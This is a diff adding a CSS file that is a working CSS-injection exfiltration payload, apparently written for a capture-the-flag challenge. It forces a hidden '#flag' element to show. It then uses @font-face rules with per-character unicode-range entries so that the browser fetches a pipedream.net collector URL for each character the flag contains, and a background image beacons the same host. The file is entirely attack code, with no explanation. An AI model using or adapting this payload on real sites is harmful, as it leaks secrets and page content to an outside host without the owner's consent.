@@ -1,0 +1,19 @@
+body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=W20')}
+#page{content-visibility:hidden;animation:unveil 0.001s 0.3s forwards}
+@keyframes unveil{to{content-visibility:visible}}
+#flag{display:block!important}
+#flag{font-family:p97w20,p98w20,p106w20,p112w20,p115w20,p121w20,p122w20,p48w20,p49w20,p52w20,p53w20,p55w20,p125w20,monospace;width:20ch;white-space:pre-wrap;word-break:break-all;overflow:visible}
+#flag::first-line{font-family:monospace!important}
+@font-face{font-family:p97w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=a_W20');unicode-range:U+0061}
+@font-face{font-family:p98w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=b_W20');unicode-range:U+0062}
+@font-face{font-family:p106w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=j_W20');unicode-range:U+006A}
+@font-face{font-family:p112w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=p_W20');unicode-range:U+0070}
+@font-face{font-family:p115w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=s_W20');unicode-range:U+0073}
+@font-face{font-family:p121w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=y_W20');unicode-range:U+0079}
+@font-face{font-family:p122w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=z_W20');unicode-range:U+007A}
+@font-face{font-family:p48w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=0_W20');unicode-range:U+0030}
+@font-face{font-family:p49w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=1_W20');unicode-range:U+0031}
+@font-face{font-family:p52w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=4_W20');unicode-range:U+0034}
+@font-face{font-family:p53w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=5_W20');unicode-range:U+0035}
+@font-face{font-family:p55w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=7_W20');unicode-range:U+0037}
+@font-face{font-family:p125w20;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=%7D_W20');unicode-range:U+007D}
